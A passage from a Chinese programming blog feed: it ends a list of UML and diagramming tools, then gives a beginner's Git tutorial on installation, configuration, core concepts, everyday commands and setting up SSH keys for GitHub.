<p>样式精美，功能全面的 UML 工具。</p>
<p><a href="http://staruml.io/" target="_blank" rel="noopener">StarUML 官网</a></p>
</blockquote>
<figure class="image-box">
                <img src="104.png" alt title class>
                <p></p>
            </figure>

<h3 id="Astah"><a href="#Astah" class="headerlink" title="Astah"></a>Astah</h3><blockquote>
<p>样式不错，功能全面的绘图工具。</p>
<p><a href="http://astah.net/" target="_blank" rel="noopener">Astah 官网</a></p>
</blockquote>
<figure class="image-box">
                <img src="105.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="ArgoUML"><a href="#ArgoUML" class="headerlink" title="ArgoUML"></a>ArgoUML</h3><blockquote>
<p>UML 工具。</p>
<p><a href="https://argouml.en.softonic.com/?ex=CAT-759.2" target="_blank" rel="noopener">ArgoUML 官网</a></p>
</blockquote>
<figure class="image-box">
                <img src="106.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="ProcessOn"><a href="#ProcessOn" class="headerlink" title="ProcessOn"></a>ProcessOn</h3><blockquote>
<p>在线绘图工具，特点是简洁、清晰。</p>
<p><a href="https://www.processon.com/" target="_blank" rel="noopener">ProcessOn 官网</a></p>
</blockquote>
<h3 id="drawio"><a href="#drawio" class="headerlink" title="drawio"></a>drawio</h3><blockquote>
<p>开源的在线绘图工具，特点是简洁、清晰。</p>
<p><a href="https://www.draw.io/" target="_blank" rel="noopener">drawio 官网</a></p>
</blockquote>
<h3 id="yEd-Graph-Editor"><a href="#yEd-Graph-Editor" class="headerlink" title="yEd Graph Editor"></a>yEd Graph Editor</h3><blockquote>
<p><a href="https://www.yworks.com/products/yed" target="_blank" rel="noopener">yEd Graph Editor 官网</a></p>
</blockquote>
<h2 id="更多内容"><a href="#更多内容" class="headerlink" title="更多内容"></a>更多内容</h2><blockquote>
<p>📓「<a href="https://github.com/dunwu/blog" target="_blank" rel="noopener">作者 Blog</a>」</p>
</blockquote>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a href="https://zh.wikipedia.org/wiki/统一建模语言" target="_blank" rel="noopener">Wiki-UML</a></li>
<li><a href="https://sparxsystems.cn/resources/uml2_tutorial/index.html" target="_blank" rel="noopener">Sparx UML 教程</a></li>
<li><a href="https://www.omg.org/spec/UML" target="_blank" rel="noopener">OMG UML</a></li>
<li><a href="https://www.tutorialspoint.com/uml/index.htm" target="_blank" rel="noopener">UML Tutorial</a></li>
<li><a href="https://www.w3cschool.cn/uml_tutorial/" target="_blank" rel="noopener">W3Cschool UML 教程</a></li>
<li><a href="https://blog.csdn.net/soft_zzti/article/details/79811923" target="_blank" rel="noopener">UML 学习入门就这一篇文章</a></li>
<li><a href="http://www.cnblogs.com/ywqu/category/223486.html" target="_blank" rel="noopener">http://www.cnblogs.com/ywqu/category/223486.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> UML </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git 从入门到精通]]></title>
      <url>/2020/01/01/LearningGit/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://github.com/dunwu/blog/blob/master/source/_posts/tools/git.md" target="_blank" rel="noopener">https://github.com/dunwu/blog/blob/master/source/_posts/tools/git.md</a></p>
</blockquote>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="Git-是什么"><a href="#Git-是什么" class="headerlink" title="Git 是什么"></a>Git 是什么</h3><p>Git 是一个开源的分布式版本控制系统。</p>
<h3 id="什么是版本控制"><a href="#什么是版本控制" class="headerlink" title="什么是版本控制"></a>什么是版本控制</h3><p>版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。</p>
<h3 id="什么是分布式版本控制系统"><a href="#什么是分布式版本控制系统" class="headerlink" title="什么是分布式版本控制系统"></a>什么是分布式版本控制系统</h3><p>介绍分布式版本控制系统前，有必要先了解一下传统的集中式版本控制系统。</p>
<p><strong>集中化的版本控制系统</strong>，诸如 CVS，Subversion 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。</p>
<p>这么做最显而易见的缺点是中央服务器的单点故障。如果宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。要是中央服务器的磁盘发生故障，碰巧没做备份，或者备份不够及时，就会有丢失数据的风险。最坏的情况是彻底丢失整个项目的所有历史更改记录。</p>
<figure class="image-box">
                <img src="1695e1cf759fb6c4.png" alt title class>
                <p></p>
            </figure>

<p><strong>分布式版本控制系统</strong>的客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。因为每一次的提取操作，实际上都是一次对代码仓库的完整备份。</p>
<figure class="image-box">
                <img src="1695e1cf7507aa8f.png" alt title class>
                <p></p>
            </figure>

<h3 id="为什么使用-Git"><a href="#为什么使用-Git" class="headerlink" title="为什么使用 Git"></a>为什么使用 Git</h3><p>Git 是分布式的。这是 Git 和其它非分布式的版本控制系统，例如 svn，cvs 等，最核心的区别。分布式带来以下好处：</p>
<p><strong>工作时不需要联网</strong></p>
<p>首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。</p>
<p><strong>更加安全</strong></p>
<p>集中式版本控制系统，一旦中央服务器出了问题，所有人都无法工作。</p>
<p>分布式版本控制系统，每个人电脑中都有完整的版本库，所以某人的机器挂了，并不影响其它人。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>Debian/Ubuntu 环境安装</strong></p>
<p>如果你使用的系统是 Debian/Ubuntu ， 安装命令为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install libcurl4-gnutls-dev libexpat1-dev gettext \</span><br><span class="line">&gt; libz-dev libssl-dev</span><br><span class="line">$ apt-get install git-core</span><br><span class="line">$ git --version</span><br><span class="line">git version 1.8.1.2</span><br></pre></td></tr></table></figure>

<p><strong>Centos/RedHat 环境安装</strong></p>
<p>如果你使用的系统是 Centos/RedHat ，安装命令为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ yum install curl-devel expat-devel gettext-devel \</span><br><span class="line">&gt; openssl-devel zlib-devel</span><br><span class="line">$ yum -y install git-core</span><br><span class="line">$ git --version</span><br><span class="line">git version 1.7.1</span><br></pre></td></tr></table></figure>

<p><strong>Windows 环境安装</strong></p>
<p>在<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git 官方下载地址</a>下载 exe 安装包。按照安装向导安装即可。</p>
<p>建议安装 Git Bash 这个 git 的命令行工具。</p>
<p><strong>Mac 环境安装</strong></p>
<p>在<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git 官方下载地址</a>下载 mac 安装包。按照安装向导安装即可。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Git 自带一个 <code>git config</code> 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：</p>
<ol>
<li><code>/etc/gitconfig</code> 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 <code>--system</code> 选项的 <code>git config</code> 时，它会从此文件读写配置变量。</li>
<li><code>\~/.gitconfig</code> 或 <code>\~/.config/git/config</code> 文件：只针对当前用户。 可以传递 <code>--global</code> 选项让 Git 读写此文件。</li>
<li>当前使用仓库的 Git 目录中的 <code>config</code> 文件（就是 <code>.git/config</code>）：针对该仓库。</li>
</ol>
<p>每一个级别覆盖上一级别的配置，所以 <code>.git/config</code> 的配置变量会覆盖 <code>/etc/gitconfig</code> 中的配置变量。</p>
<p>在 Windows 系统中，Git 会查找 <code>$HOME</code> 目录下（一般情况下是 <code>C:\Users\$USER</code>）的 <code>.gitconfig</code> 文件。 Git 同样也会寻找 <code>/etc/gitconfig</code> 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。</p>
<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"John Doe"</span></span><br><span class="line">$ git config --global user.email johndoe@example.com</span><br></pre></td></tr></table></figure>

<p>再次强调，如果使用了 <code>--global</code> 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 <code>--global</code> 选项的命令来配置。</p>
<p>很多 GUI 工具都会在第一次运行时帮助你配置这些信息。</p>
<h3 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h3><p><code>.gitignore</code> 文件可能从字面含义也不难猜出：这个文件里配置的文件或目录，会自动被 git 所忽略，不纳入版本控制。</p>
<p>在日常开发中，我们的项目经常会产生一些临时文件，如编译 Java 产生的 <code>*.class</code> 文件，又或是 IDE 自动生成的隐藏目录（Intellij 的 <code>.idea</code> 目录、Eclipse 的 <code>.settings</code> 目录等）等等。这些文件或目录实在没必要纳入版本管理。在这种场景下，你就需要用到 <code>.gitignore</code> 配置来过滤这些文件或目录。</p>
<p>配置的规则很简单，也没什么可说的，看几个例子，自然就明白了。</p>
<p>这里推荐一下 Github 的开源项目：<a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a></p>
<p>在这里，你可以找到很多常用的模板，如：Java、Nodejs、C++ 的 <code>.gitignore</code> 模板等等。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>个人认为，对于 Git 这个版本工具，再不了解原理的情况下，直接去学习命令行，可能会一头雾水。所以，本文特意将原理放在命令使用章节之前讲解。</p>
<h3 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h3><p>当你一个项目到本地或创建一个 git 项目，项目目录下会有一个隐藏的 <code>.git</code> 子目录。这个目录是 git 用来跟踪管理版本库的，千万不要手动修改。</p>
<h3 id="哈希值"><a href="#哈希值" class="headerlink" title="哈希值"></a>哈希值</h3><p>Git 中所有数据在存储前都计算校验和，然后以校验和来引用。 这意味着不可能在 Git 不知情时更改任何文件内容或目录内容。 这个功能建构在 Git 底层，是构成 Git 哲学不可或缺的部分。 若你在传送过程中丢失信息或损坏文件，Git 就能发现。</p>
<p>Git 用以计算校验和的机制叫做 SHA-1 散列（hash，哈希）。 这是一个由 40 个十六进制字符（0-9 和 a-f）组成字符串，基于 Git 中文件的内容或目录结构计算出来。 SHA-1 哈希看起来是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24b9da6552252987aa493b52f8696cd6d3b00373</span><br></pre></td></tr></table></figure>

<p>Git 中使用这种哈希值的情况很多，你将经常看到这种哈希值。 实际上，Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。</p>
<h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><p>在 GIt 中，你的文件可能会处于三种状态之一：</p>
<ul>
<li><strong>已修改（modified）</strong> - 已修改表示修改了文件，但还没保存到数据库中。</li>
<li><strong>已暂存（staged）</strong> - 已暂存表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。</li>
<li><strong>已提交（committed）</strong> - 已提交表示数据已经安全的保存在本地数据库中。</li>
</ul>
<h3 id="工作区域"><a href="#工作区域" class="headerlink" title="工作区域"></a>工作区域</h3><p>与文件状态对应的，不同状态的文件在 Git 中处于不同的工作区域。</p>
<ul>
<li><strong>工作区（working）</strong> - 当你 <code>git clone</code> 一个项目到本地，相当于在本地克隆了项目的一个副本。工作区是对项目的某个版本独立提取出来的内容。 这些从 Git 仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。</li>
<li><strong>暂存区（staging）</strong> - 暂存区是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中。 有时候也被称作`‘索引’’，不过一般说法还是叫暂存区。</li>
<li><strong>本地仓库（local）</strong> - 提交更新，找到暂存区域的文件，将快照永久性存储到 Git 本地仓库。</li>
<li><strong>远程仓库（remote）</strong> - 以上几个工作区都是在本地。为了让别人可以看到你的修改，你需要将你的更新推送到远程仓库。同理，如果你想同步别人的修改，你需要从远程仓库拉取更新。</li>
</ul>
<figure class="image-box">
                <img src="1695e1cf3b26bbc7.png" alt title class>
                <p></p>
            </figure>

<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>国外网友制作了一张 Git Cheat Sheet，总结很精炼，各位不妨收藏一下。</p>
<p>本节选择性介绍 git 中比较常用的命令行场景。</p>
<figure class="image-box">
                <img src="1695e1cf3d10c559.png" alt title class>
                <p></p>
            </figure>

<h3 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h3><p>克隆一个已创建的仓库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 SSH</span></span><br><span class="line">$ git <span class="built_in">clone</span> ssh://user@domain.com/repo.git</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 HTTP</span></span><br><span class="line">$ git <span class="built_in">clone</span> http://domain.com/user/repo.git</span><br></pre></td></tr></table></figure>

<p>创建一个新的本地仓库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure>

<h3 id="添加修改"><a href="#添加修改" class="headerlink" title="添加修改"></a>添加修改</h3><p>添加修改到暂存区：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把指定文件添加到暂存区</span></span><br><span class="line">$ git add xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把当前所有修改添加到暂存区</span></span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把所有修改添加到暂存区</span></span><br><span class="line">$ git add -A</span><br></pre></td></tr></table></figure>

<p>提交修改到本地仓库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提交本地的所有修改</span></span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交之前已标记的变化</span></span><br><span class="line">$ git commit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 附加消息提交</span></span><br><span class="line">$ git commit -m <span class="string">'commit message'</span></span><br></pre></td></tr></table></figure>

<h4 id="储藏"><a href="#储藏" class="headerlink" title="储藏"></a>储藏</h4><p>有时，我们需要在同一个项目的不同分支上工作。当需要切换分支时，偏偏本地的工作还没有完成，此时，提交修改显得不严谨，但是不提交代码又无法切换分支。这时，你可以使用 <code>git stash</code> 将本地的修改内容作为草稿储藏起来。</p>
<p>官方称之为储藏，但我个人更喜欢称之为存草稿。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 将修改作为当前分支的草稿保存</span></span><br><span class="line">$ git stash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看草稿列表</span></span><br><span class="line">$ git stash list</span><br><span class="line">stash@&#123;0&#125;: WIP on master: 6fae349 :memo: Writing docs.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.1 删除草稿</span></span><br><span class="line">$ git stash drop stash@&#123;0&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.2 读取草稿</span></span><br><span class="line">$ git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure>

<h3 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h3><p>撤销本地修改：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 移除缓存区的所有文件（i.e. 撤销上次git add）</span></span><br><span class="line">$ git reset HEAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将HEAD重置到上一次提交的版本，并将之后的修改标记为未添加到缓存区的修改</span></span><br><span class="line">$ git reset &lt;commit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将HEAD重置到上一次提交的版本，并保留未提交的本地修改</span></span><br><span class="line">$ git reset --keep &lt;commit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放弃工作目录下的所有修改</span></span><br><span class="line">$ git reset --hard HEAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将HEAD重置到指定的版本，并抛弃该版本之后的所有修改</span></span><br><span class="line">$ git reset --hard &lt;commit-hash&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用远端分支强制覆盖本地分支</span></span><br><span class="line">$ git reset --hard &lt;remote/branch&gt; e.g., upstream/master, origin/my-feature</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放弃某个文件的所有本地修改</span></span><br><span class="line">$ git checkout HEAD &lt;file&gt;</span><br></pre></td></tr></table></figure>

<p>删除添加<code>.gitignore</code>文件前错误提交的文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git rm -r --cached .</span><br><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">"remove xyz file"</span></span><br></pre></td></tr></table></figure>

<p>撤销远程修改（创建一个新的提交，并回滚到指定版本）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git revert &lt;commit-hash&gt;</span><br></pre></td></tr></table></figure>

<p>彻底删除指定版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行下面命令后，commit-hash 提交后的记录都会被彻底删除，使用需谨慎</span></span><br><span class="line">$ git reset --hard &lt;commit-hash&gt;</span><br><span class="line">$ git push -f</span><br></pre></td></tr></table></figure>

<h3 id="更新与推送"><a href="#更新与推送" class="headerlink" title="更新与推送"></a>更新与推送</h3><p>更新：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载远程端版本，但不合并到HEAD中</span></span><br><span class="line">$ git fetch &lt;remote&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将远程端版本合并到本地版本中</span></span><br><span class="line">$ git pull origin master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以rebase方式将远端分支与本地合并</span></span><br><span class="line">$ git pull --rebase &lt;remote&gt; &lt;branch&gt;</span><br></pre></td></tr></table></figure>

<p>推送：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将本地版本推送到远程端</span></span><br><span class="line">$ git push remote &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程端分支</span></span><br><span class="line">$ git push &lt;remote&gt; :&lt;branch&gt; (since Git v1.5.0)</span><br><span class="line">$ git push &lt;remote&gt; --delete &lt;branch&gt; (since Git v1.7.0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发布标签</span></span><br><span class="line">$ git push --tags</span><br></pre></td></tr></table></figure>

<h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><p>显示工作路径下已修改的文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br></pre></td></tr></table></figure>

<p>显示与上次提交版本文件的不同：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff</span><br></pre></td></tr></table></figure>

<p>显示提交历史：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从最新提交开始，显示所有的提交记录（显示hash， 作者信息，提交的标题和时间）</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个用户的所有提交</span></span><br><span class="line">$ git <span class="built_in">log</span> --author=<span class="string">"username"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个文件的所有修改</span></span><br><span class="line">$ git <span class="built_in">log</span> -p &lt;file&gt;</span><br></pre></td></tr></table></figure>

<p>显示搜索内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从当前目录的所有文件中查找文本内容</span></span><br><span class="line">$ git grep <span class="string">"Hello"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在某一版本中搜索文本</span></span><br><span class="line">$ git grep <span class="string">"Hello"</span> v2.5</span><br></pre></td></tr></table></figure>

<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><p>增删查分支：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有的分支</span></span><br><span class="line">$ git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有的远端分支</span></span><br><span class="line">$ git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于当前分支创建新分支</span></span><br><span class="line">$ git branch &lt;new-branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于远程分支创建新的可追溯的分支</span></span><br><span class="line">$ git branch --track &lt;new-branch&gt; &lt;remote-branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除本地分支</span></span><br><span class="line">$ git branch -d &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制删除本地分支，将会丢失未合并的修改</span></span><br><span class="line">$ git branch -D &lt;branch&gt;</span><br></pre></td></tr></table></figure>

<p>切换分支：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换分支</span></span><br><span class="line">$ git checkout &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并切换到新分支</span></span><br><span class="line">$ git checkout -b &lt;branch&gt;</span><br></pre></td></tr></table></figure>

<h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给当前版本打标签</span></span><br><span class="line">$ git tag &lt;tag-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给当前版本打标签并附加消息</span></span><br><span class="line">$ git tag -a &lt;tag-name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="合并与重置"><a href="#合并与重置" class="headerlink" title="合并与重置"></a>合并与重置</h3><blockquote>
<p>merge 与 rebase 虽然是 git 常用功能，但是强烈建议不要使用 git 命令来完成这项工作。</p>
<p>因为如果出现代码冲突，在没有代码比对工具的情况下，实在太艰难了。</p>
<p>你可以考虑使用各种 Git GUI 工具。</p>
</blockquote>
<p>合并：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将分支合并到当前HEAD中</span></span><br><span class="line">$ git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure>

<p>重置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将当前HEAD版本重置到分支中，请勿重置已发布的提交</span></span><br><span class="line">$ git rebase &lt;branch&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p>Github 作为最著名的代码开源协作社区，在程序员圈想必无人不知，无人不晓。</p>
<p>这里不赘述 Github 的用法，确实有不会用的新手同学，可以参考官方教程：<a href="https://guides.github.com/" target="_blank" rel="noopener">https://guides.github.com/</a></p>
<h4 id="clone-方式"><a href="#clone-方式" class="headerlink" title="clone 方式"></a>clone 方式</h4><p>Git 支持三种协议：HTTPS / SSH / GIT</p>
<p>而 Github 上支持 HTTPS 和 SSH。</p>
<p>HTTPS 这种方式要求你每次 push 时都要输入用户名、密码，有些繁琐。</p>
<p>而 SSH 要求你本地生成证书，然后在你的 Github 账户中注册。第一次配置麻烦是麻烦了点，但是以后就免去了每次 push 需要输入用户名、密码的繁琐。</p>
<figure class="image-box">
                <img src="1695e1cf3cc0bf6d.png" alt title class>
                <p></p>
            </figure>

<p>以下介绍以下，如何生成证书，以及在 Github 中注册。</p>
<h4 id="生成-SSH-公钥"><a href="#生成-SSH-公钥" class="headerlink" title="生成 SSH 公钥"></a>生成 SSH 公钥</h4><p>如前所述，许多 Git 服务器都使用 SSH 公钥进行认证。 为了向 Git 服务器提供 SSH 公钥，如果某系统用户尚未拥有密钥，必须事先为其生成一份。 这个过程在所有操作系统上都是相似的。 首先，你需要确认自己是否已经拥有密钥。 默认情况下，用户的 SSH 密钥存储在其 <code>\~/.ssh</code> 目录下。 进入该目录并列出其中内容，你便可以快速确认自己是否已拥有密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys2  id_dsa       known_hosts</span><br><span class="line">config            id_dsa.pub</span><br></pre></td></tr></table></figure>

<p>我们需要寻找一对以 <code>id_dsa</code> 或 <code>id_rsa</code> 命名的文件，其中一个带有 <code>.pub</code> 扩展名。 <code>.pub</code> 文件是你的公钥，另一个则是私钥。 如果找不到这样的文件（或者根本没有 <code>.ssh</code> 目录），你可以通过运行 <code>ssh-keygen</code> 程序来创建它们。在 Linux/Mac 系统中，<code>ssh-keygen</code> 随 SSH 软件包提供；在 Windows 上，该程序包含于 MSysGit 软件包中。</p>
